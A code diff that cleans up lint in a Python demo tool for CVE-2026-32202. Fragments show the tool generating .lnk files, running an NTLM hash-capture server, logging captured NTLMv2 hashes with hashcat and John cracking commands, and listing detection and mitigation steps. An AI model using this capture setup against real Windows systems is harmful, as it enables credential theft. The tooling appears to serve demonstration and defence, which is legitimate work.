@@ -30,7 +30,6 @@ Version: 1.0.0
 import struct
 import socket
 import argparse
-import sys
 import os
 import logging
 import time
@@ -527,14 +526,14 @@ class NTLMCaptureServer:
 
     def _log_capture(self, captured: CapturedHash):
         """Log a captured hash"""
-        logger.info(f"🔑 CAPTURED NTLMv2 HASH!")
+        logger.info("🔑 CAPTURED NTLMv2 HASH!")
         logger.info(f"   Domain:     {captured.domain}")
         logger.info(f"   Username:   {captured.username}")
         logger.info(f"   Source:      {captured.source_ip}:{captured.source_port}")
         logger.info(f"   Challenge:   {captured.challenge}")
         logger.info(f"   Hash:       {captured.ntlmv2_hash}")
         logger.info(f"   Hashcat:    hashcat -m 5600 '{captured.ntlmmv2_hash}'")
-        logger.info(f"   John:       john --format=netntlmv2 hash.txt")
+        logger.info("   John:       john --format=netntlmv2 hash.txt")
 
     def _build_negotiate_response_smb1(self) -> bytes:
         """Build SMB1 negotiate response with NTLMSSP challenge"""
@@ -860,7 +859,7 @@ class CVE2026_32202_Demo:
 🔍 DETECTION""")
         for d in sc.detection:
             print(f"  • {d}")
-        print(f"""
+        print("""
 🛡️  MITIGATION""")
         for m in sc.mitigation:
             print(f"  • {m}")
@@ -942,10 +941,10 @@ class CVE2026_32202_Demo:
             report.append(f"**{sc.description}**")
             report.append(f"- **Technique:** {sc.technique} ({sc.mitre})")
             report.append(f"- **Risk:** {sc.risk}")
-            report.append(f"- **Detection:**")
+            report.append("- **Detection:**")
             for d in sc.detection:
                 report.append(f"  - {d}")
-            report.append(f"- **Mitigation:**")
+            report.append("- **Mitigation:**")
             for m in sc.mitigation:
                 report.append(f"  - {m}")
             report.append("")
@@ -1077,8 +1076,8 @@ Examples:
         server = d.start_capture_server('0.0.0.0', args.port)
         print(f"\n📝 .lnk files generated in {d.output_dir}/")
         print(f"🔓 Capture server listening on 0.0.0.0:{args.port}")
-        print(f"   Place .lnk files on a Windows system and watch for hashes")
-        print(f"   Press Ctrl+C to stop\n")
+        print("   Place .lnk files on a Windows system and watch for hashes")
+        print("   Press Ctrl+C to stop\n")
         try:
             while True:
                 time.sleep(1)
